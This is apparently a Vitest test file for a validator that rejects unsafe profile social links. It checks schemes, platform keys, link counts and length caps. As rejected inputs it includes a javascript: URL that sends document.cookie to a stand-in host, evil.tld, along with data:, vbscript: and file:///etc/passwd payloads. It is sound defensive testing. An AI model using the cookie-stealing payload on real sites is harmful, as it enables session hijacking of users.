import { describe, expect, it } from "vitest";
import { assertSafeSocialLinks } from "@core/use-cases/shared/profile/social-links";
import { BadRequestError } from "@core/errors";

describe("assertSafeSocialLinks", () => {
    it("should accept ordinary links", () => {
        expect(() =>
            assertSafeSocialLinks({
                github: "https://github.com/ada",
                website: "http://ada.example",
            }),
        ).not.toThrow();
    });

    it("should accept nothing at all", () => {
        expect(() => assertSafeSocialLinks(undefined)).not.toThrow();
        expect(() => assertSafeSocialLinks(null)).not.toThrow();
        expect(() => assertSafeSocialLinks({})).not.toThrow();
    });

    it("should refuse a script scheme", () => {
        // `format: "uri"` in the schema accepts this: RFC 3986 asks for *a*
        // scheme and nothing more. A profile is public, and this is the one
        // field a client will render as an href without thinking.
        expect(() =>
            assertSafeSocialLinks({
                website: "javascript:fetch('https://evil.tld?t='+document.cookie)",
            }),
        ).toThrow(BadRequestError);
    });

    it("should refuse other non-web schemes", () => {
        for (const value of [
            "data:text/html;base64,PHNjcmlwdD4x",
            "vbscript:msgbox(1)",
            "file:///etc/passwd",
        ]) {
            expect(() => assertSafeSocialLinks({ website: value })).toThrow(
                BadRequestError,
            );
        }
    });

    it("should refuse something that is not a URL at all", () => {
        expect(() => assertSafeSocialLinks({ website: "ada.example" })).toThrow(
            BadRequestError,
        );
    });

    it("should refuse a key that is not a platform name", () => {
        for (const key of ["", "Has Spaces", "1st", "a".repeat(21), "<b>"]) {
            expect(() =>
                assertSafeSocialLinks({ [key]: "https://ada.example" }),
            ).toThrow(BadRequestError);
        }
    });

    it("should refuse an unbounded pile of links", () => {
        const many = Object.fromEntries(
            Array.from({ length: 11 }, (_, i) => [
                `site${i}`,
                "https://ada.example",
            ]),
        );

        expect(() => assertSafeSocialLinks(many)).toThrow(BadRequestError);
    });

    it("should refuse a link longer than the cap", () => {
        expect(() =>
            assertSafeSocialLinks({
                website: `https://ada.example/${"x".repeat(300)}`,
            }),
        ).toThrow(BadRequestError);
    });
});
